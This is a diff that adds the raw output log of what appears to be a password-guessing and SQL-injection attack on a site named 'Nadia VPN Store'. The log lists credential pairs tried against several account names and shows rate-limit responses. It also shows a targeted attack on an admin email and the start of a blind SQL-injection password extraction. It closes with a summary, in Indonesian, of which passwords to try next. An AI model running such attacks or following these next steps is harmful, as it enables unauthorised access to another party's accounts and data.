@@ -1,0 +1,33 @@
+[*] Testing passwords on non-standard emails...
+
+  [email error] nadiavpn:admin123
+  [email error] nadiavpn:password
+  [email error] nadiavpn:admin
+  [email error] nadiavpn:nadia123
+  [email error] nadiavpn:nadiavpn
+  [email error] nadiavpn:123456
+  [HTTP 429] nadia@vpn:admin123
+  [HTTP 429] nadia@vpn:password
+  [OTHER: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 2, mes] nadia@vpn:nadiavpn
+  [OTHER: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 2, mes] nadia@vpn:admin
+  [OTHER: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 2, mes] nadia@vpn:nadia123
+  [OTHER: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 2, mes] admin@nadia:admin123
+  [OTHER: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 2, mes] admin@nadia:password
+  [OTHER: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 2, mes] admin@nadia:nadiavpn
+  [OTHER: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 2, mes] admin@nadia:admin
+  [OTHER: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 2, mes] admin@nadia:nadia123
+
+[*] Testing admin email nama@email.com with special passwords...
+  [OTHER] nama@email.com:nadiavpn
+  [OTHER] nama@email.com:nadia123
+  [ERROR] nama@email.com:Nadia@2024
+  [ERROR] nama@email.com:Nadia2024
+  [ERROR] nama@email.com:Nadia123
+
+[*] Extracting password via SQLi (binary search)...
+  Getting password length...
+
+=== RESULT ===
+Email admin: nama@email.com
+Coba password: nadiavpn, nadia123, Nadia@2024, admin
+Non-standard emails bisa lolos validasi: nadiavpn, nadia@vpn, admin@nadia
